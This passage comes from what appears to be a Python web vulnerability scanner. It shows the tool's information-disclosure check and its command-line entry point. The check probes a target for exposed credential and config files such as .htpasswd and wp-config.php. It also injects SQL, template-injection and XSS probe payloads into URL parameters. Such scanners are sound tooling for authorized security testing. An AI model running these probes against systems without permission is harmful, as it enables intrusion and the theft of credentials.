            'config.xml',
            'settings.php',
            'database.yml',
            'credentials.xml',
            'wp-config.php',
            'connection.php',
            'db.php',
            'backup.sql',
            'dump.sql',
            'users.sql',
            'passwords.txt',
            'admin.php',
            'phpinfo.php',
            'server-status',
            'server-info',
            '.htpasswd',
            'web.config',
            'error_log',
            'debug.log',
            'access.log',
        ]
        
        for file in sensitive_files:
            test_url = urljoin(self.url, file)
            response = make_request(test_url)
            
            if response and response.status_code == 200:
                # Check for indicators of sensitive information
                indicators = {
                    '.git/config': ['repositoryformatversion', 'filemode', 'bare', 'remote'],
                    '.svn/entries': ['dir', 'file', 'svn:'],
                    '.env': ['DB_', 'API_', 'SECRET', 'KEY', 'TOKEN', 'PASSWORD'],
                    'config': ['database', 'username', 'password', 'host', 'port', 'key', 'secret'],
                    'database': ['CREATE TABLE', 'INSERT INTO', 'DROP TABLE'],
                    'credentials': ['user', 'pass', 'login', 'admin'],
                    'phpinfo': ['PHP Version', 'System', 'Build Date', 'Configure Command'],
                    'server-status': ['CPU Usage', 'Uptime', 'Requests', 'Clients'],
                    'log': ['ERROR', 'WARNING', 'INFO', 'DEBUG', 'EXCEPTION'],
                    'htpasswd': [':', '$apr1$', '$2y$'],
                }
                
                for indicator_key, indicator_values in indicators.items():
                    if indicator_key in file.lower() and any(indicator in response.text for indicator in indicator_values):
                        info_disclosure.append({
                            'url': test_url,
                            'file': file,
                            'description': f"Sensitive information found in {file}"
                        })
                        if self.verbose:
                            print(f"{Fore.RED}[!] Sensitive information found in {file} at {test_url}{Style.RESET_ALL}")
                        break
        
        # Check for comments with sensitive information in HTML
        response = make_request(self.url)
        if response:
            soup = BeautifulSoup(response.text, 'html.parser')
            comments = soup.find_all(string=lambda text: isinstance(text, str) and text.strip().startswith('<!--'))
            
            sensitive_keywords = ['password', 'username', 'api', 'key', 'token', 'secret', 'admin', 'db', 'database', 'todo', 'fix', 'bug', 'hack', 'workaround', 'bypass']
            
            for comment in comments:
                comment_text = comment.strip().lower()
                if any(keyword in comment_text for keyword in sensitive_keywords):
                    info_disclosure.append({
                        'url': self.url,
                        'type': 'html_comment',
                        'description': "Sensitive information found in HTML comment",
                        'comment': comment.strip()
                    })
                    if self.verbose:
                        print(f"{Fore.RED}[!] Sensitive information found in HTML comment at {self.url}{Style.RESET_ALL}")
        
        # Check for error messages
        error_payloads = [
            "'",  # SQL error
            "\"'",  # SQL error
            "1/0",  # Division by zero
            "{{7*7}}",  # Template injection
            "${7*7}",  # Expression evaluation
            "<script>alert(1)</script>",  # XSS
        ]
        
        parsed_url = urlparse(self.url)
        if parsed_url.query:
            query_params = parsed_url.query.split('&')
            for param in query_params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    for payload in error_payloads:
                        # Replace this parameter with our payload
                        new_query = parsed_url.query.replace(param, f"{param_name}={payload}")
                        test_url = self.url.replace(parsed_url.query, new_query)
                        
                        test_response = make_request(test_url)
                        if test_response:
                            # Look for signs of error messages
                            error_indicators = [
                                'error', 'exception', 'warning', 'stack trace', 'syntax error',
                                'undefined', 'invalid', 'unexpected', 'fatal', 'notice',
                                'deprecated', 'unknown', 'failed', 'missing', 'not found',
                                'line', 'file', 'sql', 'query', 'database', 'at line',
                                'thrown', 'called', 'function', 'class', 'method'
                            ]
                            
                            if any(indicator in test_response.text.lower() for indicator in error_indicators):
                                info_disclosure.append({
                                    'url': test_url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'type': 'error_message',
                                    'description': "Error message disclosure"
                                })
                                if self.verbose:
                                    print(f"{Fore.RED}[!] Error message disclosure via parameter {param_name} with payload {payload}{Style.RESET_ALL}")
                                break  # Found a working payload for this parameter
        
        if info_disclosure:
            self.results['information_disclosure'] = info_disclosure
            print(f"{Fore.RED}[!] Found {len(info_disclosure)} potential Information Disclosure issues{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No Information Disclosure issues found{Style.RESET_ALL}")

# Main function for standalone usage
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Vulnerability Scanner for Web Penetration Testing')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', help='Verbose output', action='store_true')
    parser.add_argument('-s', '--scan', help='Specify scan type (all, xss, sqli, csrf, etc.)', default='all')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url
    
    print(f"{Fore.CYAN}[*] Target: {args.url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
    
    # Scan for vulnerabilities
    vulnerability_scanner = VulnerabilityScanner(args.url, args.verbose)
    
    if args.scan.lower() == 'all':
        results = vulnerability_scanner.scan_all()
    elif args.scan.lower() == 'xss':
        vulnerability_scanner.scan_xss()
        results = {'xss_vulnerabilities': vulnerability_scanner.results.get('xss_vulnerabilities', [])}
    elif args.scan.lower() == 'sqli':
        vulnerability_scanner.scan_sql_injection()
        results = {'sqli_vulnerabilities': vulnerability_scanner.results.get('sqli_vulnerabilities', [])}
    elif args.scan.lower() == 'csrf':
        vulnerability_scanner.scan_csrf()
        results = {'csrf_vulnerabilities': vulnerability_scanner.results.get('csrf_vulnerabilities', [])}
    elif args.scan.lower() == 'open_redirect':
        vulnerability_scanner.scan_open_redirects()
        results = {'open_redirect_vulnerabilities': vulnerability_scanner.results.get('open_redirect_vulnerabilities', [])}
    elif args.scan.lower() == 'misconfig':
        vulnerability_scanner.scan_misconfigurations()
        results = {'misconfigurations': vulnerability_scanner.results.get('misconfigurations', [])}
    elif args.scan.lower() == 'headers':
        vulnerability_scanner.scan_insecure_headers()
        results = {'insecure_headers': vulnerability_scanner.results.get('insecure_headers', [])}
    elif args.scan.lower() == 'clickjacking':
        vulnerability_scanner.scan_clickjacking()
        results = {'clickjacking_vulnerability': vulnerability_scanner.results.get('clickjacking_vulnerability', {})}
    elif args.scan.lower() == 'ssrf':
        vulnerability_scanner.scan_ssrf()
        results = {'ssrf_vulnerabilities': vulnerability_scanner.results.get('ssrf_vulnerabilities', [])}
    elif args.scan.lower() == 'file_inclusion':
        vulnerability_scanner.scan_file_inclusion()
        results = {'file_inclusion_vulnerabilities': vulnerability_scanner.results.get('file_inclusion_vulnerabilities', [])}
    elif args.scan.lower() == 'info_disclosure':
        vulnerability_scanner.scan_information_disclosure()
        results = {'information_disclosure': vulnerability_scanner.results.get('information_disclosure', [])}
    else:
        print(f"{Fore.RED}[!] Unknown scan type: {args.scan}{Style.RESET_ALL}")
        sys.exit(1)
    
    # Save results to file if specified
    if args.output:
        try:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=4)
            print(f"{Fore.GREEN}[+] Results saved to {args.output}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error saving results: {e}{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}[+] Vulnerability scan completed!{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] An error occurred: {e}{Style.RESET_ALL}")
        sys.exit(1)